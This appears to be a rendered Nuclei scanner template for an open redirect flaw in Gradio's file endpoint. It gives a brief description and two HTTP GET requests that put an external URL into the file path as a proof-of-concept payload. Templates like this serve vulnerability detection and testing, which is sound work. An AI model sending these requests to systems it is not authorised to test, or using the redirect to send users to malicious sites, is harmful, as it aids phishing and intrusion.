# Nuclei Template: Gradio - Open Redirect
**Template ID:** gradio-file-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Low
**Source:** Nuclei Template (`gradio-file-redirect.yaml`)

## Vulnerability Information & PoC

## Description
An open redirect vulnerability in Gradio allows attackers to craft malicious URLs that redirect users to external, potentially harmful sites without proper validation.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/gradio_api/file=http://example.com
GET {{BaseURL}}/file=http://example.com
```

